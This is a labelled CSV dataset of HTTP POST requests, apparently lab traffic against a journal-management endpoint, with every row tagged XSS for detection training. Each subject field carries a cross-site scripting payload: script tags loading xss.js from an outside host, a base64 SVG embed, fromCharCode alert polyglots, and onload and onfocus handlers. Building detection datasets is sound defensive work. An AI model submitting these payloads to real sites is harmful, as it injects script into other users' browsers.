request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
d221c1bccde0d68bec636db30eca3f54,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cEMBED%20SRC%3d%22data%3aimage%2fsvg%2bxml%3bbase64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2bYWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3d%3d%22%20type%3d%22image%2fsvg%2bxml%22%20AllowScriptAccess%3d%22always%22%3e%3c%2fEMBED%3e&comment=%3Cp%3EThe%20article%20discusses%20the%20economic%20implications%20of%20cryptocurrency%20regulation%20and%20its%20effect%20on%20fintech%20innovation%20in%20Southeast%20Asia%2e%3C%2Fp%3E&submitFormButton=",793,172.19.2.40,42026,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
72e36b58d6117bc404b4b85eb9110b7d,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cSCRIPT%20a%3d%22%3e%22%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e&comment=%3Cp%3EA%20comprehensive%20review%20of%20mental%20health%20interventions%20in%20corporate%20environments%20shows%20that%20workplace%20wellness%20programs%20reduce%20employee%20burnout%20significantly%2e%3C%2Fp%3E&submitFormButton=,431,172.19.2.40,42018,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
2e5c772e1d8bc2ac5442cebb2f5a9dcd,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cSCRIPT%20a%3d%22%3e%22%20''%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e&comment=%3Cp%3EThis%20research%20examines%20the%20effectiveness%20of%20AI-powered%20customer%20service%20chatbots%20and%20their%20limitations%20in%20handling%20complex%20client%20interactions%2e%3C%2Fp%3E&submitFormButton=,420,172.19.2.40,42074,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
a69ff4e4ffc2843d4538bdd78fea42e6,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cSCRIPT%20%22a%3d'%3e'%22%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e&comment=%3Cp%3EThe%20paper%20investigates%20educational%20disparities%20in%20STEM%20fields%20and%20proposes%20mentorship%20programs%20to%20increase%20diversity%20among%20young%20scientists%2e%3C%2Fp%3E&submitFormButton=,414,172.19.2.40,42042,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
18294d1276b56460932753582ee3f9e3,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cSCRIPT%20a%3d%22%3e'%3e%22%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e&comment=%3Cp%3EAn%20analysis%20of%20urban%20green%20spaces%20reveals%20their%20significant%20impact%20on%20air%20quality,%20property%20values,%20and%20citizen%20mental%20health%2e%3C%2Fp%3E&submitFormButton=",404,172.19.2.40,42030,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
547a584e8fb3b274bce695431a880e78,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cSCRIPT%3edocument%2ewrite(%22%3cSCRI%22)%3b%3c%2fSCRIPT%3ePT%20SRC%3d%22http%3a%2f%2fha%2eckers%2eorg%2fxss%2ejs%22%3e%3c%2fSCRIPT%3e&comment=%3Cp%3EThis%20study%20explores%20how%20autonomous%20vehicles%20will%20reshape%20urban%20infrastructure%20and%20traffic%20management%20systems%20in%20smart%20cities%2e%3C%2Fp%3E&submitFormButton=,433,172.19.2.40,42064,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
4f9d6f58476a01ef33c2ebfbc9351292,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%3cSCRIPT%3ealert(%22XSS%22)%3b%2f%2f%3c%3c%2fSCRIPT%3e&comment=%3Cp%3EThe%20article%20reviews%20data%20privacy%20regulations%20across%20different%20continents%20and%20their%20varying%20approaches%20to%20protecting%20consumer%20information%20online%2e%3C%2Fp%3E&submitFormButton=,376,172.19.2.40,42056,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
87de395e7a98e9ca890b4c72f31ce063,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%22'%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode(88,83,83))%2f%2f--%3e%3c%2fSCRIPT%3e%22%3e'%3e%3cSCRIPT%3ealert(String%2efromCharCode(88,83,83))%3c%2fSCRIPT%3e&comment=%3Cp%3EA%20research%20paper%20examines%20the%20correlation%20between%20corporate%20social%20responsibility%20initiatives%20and%20long-term%20brand%20loyalty%20among%20millennial%20consumers%2e%3C%2Fp%3E&submitFormButton=",626,172.19.2.40,41986,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
b06496078e6349fed1db76a7e7fca966,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject='%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode(88,83,83))%2f%2f--%3e%3c%2fSCRIPT%3e%22%3e'%3e%3cSCRIPT%3ealert(String%2efromCharCode(88,83,83))%3c%3f%2fSCRIPT%3e%26submit%2ex%3d27%26submit%2ey%3d9%26cmd%3dsearch&comment=%3Cp%3EThis%20investigation%20analyzes%20microplastics%20contamination%20in%20freshwater%20ecosystems%20and%20proposes%20industrial%20filtration%20standards%20to%20prevent%20further%20pollution%2e%3C%2Fp%3E&submitFormButton=",677,172.19.2.40,42002,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
40687e6351ed214239065696a23c446c,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cscript%3ealert(%22hellox%20worldss%22)%3c%2fscript%3e%26safe%3dhigh%26cx%3d006665157904466893121%3asu_tzknyxug%26cof%3dFORID%3a9%23510&comment=%3Cp%3EThe%20article%20discusses%20the%20potential%20of%20quantum%20computing%20in%20breaking%20current%20encryption%20standards%20and%20its%20implications%20for%20cybersecurity%2e%3C%2Fp%3E&submitFormButton=,448,172.19.2.40,42060,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
1bbc3d0af4224390eb5a80f69d580c35,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cscript%3ealert(%22XSS%22)%3b%3c%2fscript%3e%26search%3d1&comment=%3Cp%3EA%20study%20on%20remote%20learning%20effectiveness%20during%20the%20pandemic%20reveals%20both%20advantages%20in%20accessibility%20and%20challenges%20with%20student%20engagement%20and%20equity%2e%3C%2Fp%3E&submitFormButton=,391,172.19.2.40,42018,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
981764cf9c4019d12cd406c4fc5e1381,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=0%26q%3d'%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert%2%3f8String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode%3f(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode(88,83,83)%%3f29%2f%2f--%3e%3c%2fSCRIPT%3e%22%3e'%3e%3cSCRIPT%3ealert(String%2efromCharCode(88,83%%3f2C83))%3c%2fSCRIPT%3e%26submit-frmGoogleWeb%3dWeb%2bSearch&comment=%3Cp%3EThis%20paper%20explores%20the%20role%20of%20women%20entrepreneurs%20in%20sustainable%20business%20innovation%20and%20barriers%20they%20face%20in%20securing%20venture%20capital%20funding%2e%3C%2Fp%3E&submitFormButton=",686,172.19.2.40,42074,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
3687626707293a431bf399ad76fc7907,"Fri, 12 Jun 2026 07:52:35 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3ch1%3e%3cfont%20color%3dblue%3ehellox%20worldss%3c%2fh1%3e&comment=%3Cp%3EThe%20research%20examines%20how%20augmented%20reality%20transforms%20customer%20shopping%20experiences%20and%20its%20impact%20on%20e-commerce%20conversion%20rates%2e%3C%2Fp%3E&submitFormButton=,363,172.19.2.40,42026,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f3323d06c45d18a82b6a6fefd05db44a,"Fri, 12 Jun 2026 07:52:36 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cBODY%20ONLOAD%3dalert('hellox%20worldss')%3e&comment=%3Cp%3EAn%20analysis%20of%20antibiotic%20resistance%20patterns%20in%20hospital%20settings%20proposes%20new%20stewardship%20protocols%20to%20combat%20the%20rise%20of%20drug-resistant%20bacteria%2e%3C%2Fp%3E&submitFormButton=,373,172.19.2.40,42042,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f9070430c2fd1dd7966035aeae18ba11,"Fri, 12 Jun 2026 07:52:36 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=5&wasNew=&submissionId=16&stageId=5,queryId=5&wasNew=&submissionId=16&stageId=5,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cinput%20onfocus%3dwrite(XSS)%20autofocus%3e&comment=%3Cp%3EThis%20article%20investigates%20the%20connection%20between%20inadequate%20sleep%20and%20chronic%20disease%20development,%20offering%20evidence-based%20sleep%20hygiene%20recommendations%2e%3C%2Fp%3E&submitFormButton=",371,172.19.2.40,42030,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
